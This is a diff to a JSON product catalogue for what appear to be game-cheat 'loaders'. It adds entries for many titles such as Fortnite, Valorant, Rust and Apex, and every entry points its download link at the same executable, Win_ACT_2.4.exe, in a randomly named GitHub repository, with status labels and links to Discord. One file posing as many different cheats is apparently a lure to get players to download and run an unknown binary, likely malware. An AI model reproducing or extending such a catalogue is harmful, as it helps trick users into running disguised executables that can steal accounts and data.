@@ -66,7 +66,7 @@
         {
             "id": "Loader8",
             "name": "Loader8",
-            "categoryId": "hhl",
+            "categoryId": "hll",
             "imageUrl": "",
             "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
             "status": "online",
@@ -75,7 +75,7 @@
         {
             "id": "Loader9",
             "name": "Loader9",
-            "categoryId": "ftn",
+            "categoryId": "fortnite",
             "imageUrl": "",
             "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
             "status": "online",
@@ -88,6 +88,159 @@
             "imageUrl": "",
             "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
             "status": "online",
+            "productUrl": "https://discord.com/"
+        },
+        {
+            "id": "Loader10",
+            "name": "Loader10",
+            "categoryId": "mw3",
+            "imageUrl": "",
+            "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
+            "status": "online",
+            "productUrl": "https://discord.com/"
+        },
+        {
+            "id": "Loader11",
+            "name": "Loader11",
+            "categoryId": "mw2",
+            "imageUrl": "",
+            "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
+            "status": "updating",
+            "productUrl": "https://discord.com/"
+        },
+        {
+            "id": "Loader12",
+            "name": "Loader12",
+            "categoryId": "valorant",
+            "imageUrl": "",
+            "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
+            "status": "online",
+            "productUrl": "https://discord.com/"
+        },
+        {
+            "id": "Loader13",
+            "name": "Loader13",
+            "categoryId": "fivem",
+            "imageUrl": "",
+            "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
+            "status": "offline",
+            "productUrl": "https://discord.com/"
+        },
+        {
+            "id": "Loader14",
+            "name": "Loader14",
+            "categoryId": "rust",
+            "imageUrl": "",
+            "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
+            "status": "online",
+            "productUrl": "https://discord.com/"
+        },
+        {
+            "id": "Loader15",
+            "name": "Loader15",
+            "categoryId": "apex",
+            "imageUrl": "",
+            "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
+            "status": "online",
+            "productUrl": "https://discord.com/"
+        },
+        {
+            "id": "Loader16",
+            "name": "Loader16",
+            "categoryId": "r6",
+            "imageUrl": "",
+            "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
+            "status": "updating",
+            "productUrl": "https://discord.com/"
+        },
+        {
+            "id": "Loader17",
+            "name": "Loader17",
+            "categoryId": "dl",
+            "imageUrl": "",
+            "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
+            "status": "online",
+            "productUrl": "https://discord.com/"
+        },
+        {
+            "id": "Loader18",
+            "name": "Loader18",
+            "categoryId": "df",
+            "imageUrl": "",
+            "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
+            "status": "online",
+            "productUrl": "https://discord.com/"
+        },
+        {
+            "id": "Loader19",
+            "name": "Loader19",
+            "categoryId": "fp",
+            "imageUrl": "",
+            "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
+            "status": "offline",
+            "productUrl": "https://discord.com/"
+        },
+        {
+            "id": "Loader20",
+            "name": "Loader20",
+            "categoryId": "bf",
+            "imageUrl": "",
+            "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
+            "status": "online",
+            "productUrl": "https://discord.com/"
+        },
+        {
+            "id": "Loader21",
+            "name": "Loader21",
+            "categoryId": "mr",
+            "imageUrl": "",
+            "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
+            "status": "updating",
+            "productUrl": "https://discord.com/"
+        },
+        {
+            "id": "Loader22",
+            "name": "Loader22",
+            "categoryId": "sd",
+            "imageUrl": "",
+            "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
+            "status": "custom",
+            "productUrl": "https://discord.com/"
+        },
+        {
+            "id": "Loader23",
+            "name": "Loader23",
+            "categoryId": "h1z1",
+            "imageUrl": "",
+            "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
+            "status": "online",
+            "productUrl": "https://discord.com/"
+        },
+        {
+            "id": "Loader24",
+            "name": "Loader24",
+            "categoryId": "bs",
+            "imageUrl": "",
+            "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
+            "status": "offline",
+            "productUrl": "https://discord.com/"
+        },
+        {
+            "id": "Loader25",
+            "name": "Loader25",
+            "categoryId": "cm",
+            "imageUrl": "",
+            "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
+            "status": "online",
+            "productUrl": "https://discord.com/"
+        },
+        {
+            "id": "Loader26",
+            "name": "Loader26",
+            "categoryId": "others",
+            "imageUrl": "",
+            "downloadUrl": "https://raw.githubusercontent.com/avod245/934774600171135007_cloud/main/Loaders/Win_ACT_2.4.exe",
+            "status": "updating",
             "productUrl": "https://discord.com/"
         }
     ]
